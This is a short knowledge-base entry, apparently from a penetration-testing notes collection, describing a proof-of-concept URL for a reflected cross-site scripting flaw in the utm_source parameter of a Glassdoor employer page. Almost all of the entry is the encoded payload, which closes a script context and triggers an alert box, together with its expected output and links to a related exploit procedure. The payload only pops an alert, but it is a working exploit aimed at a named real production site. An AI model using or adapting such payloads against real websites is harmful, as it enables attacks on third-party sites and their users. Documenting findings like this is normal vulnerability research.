---
data: >-
  # Use browser to visit:

  https://www.glassdoor.com/employers/sem-dual-lp/?utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
tags:
  - xss
  - poc
type: command
executor: bash
platforms:
  - Web
id: c41d3595-1c51-45a1-bacf-1f7336100593
created_at: '2025-12-11T06:10:28.647Z'
updated_at: '2025-12-11T06:10:28.647Z'
verified: false
validated: true
submitted: true
---
# access-xss-poc-url

## Command

```bash
# Use browser to visit:
https://www.glassdoor.com/employers/sem-dual-lp/?utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
```

## Description

This command accesses a proof-of-concept URL to trigger a reflected XSS vulnerability in the utm_source parameter, injecting a payload that executes an alert.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url` | The full POC URL with encoded payload | Yes |

## Examples

### Basic Usage

```bash
# Open in browser
```

## Expected Output

An alert box displaying 'xss' in the browser window.

## Related

- [[procedures/Exploit-Reflected-XSS-via-utm_source]]
- [[commands/access-backtick-xss-poc-url]]
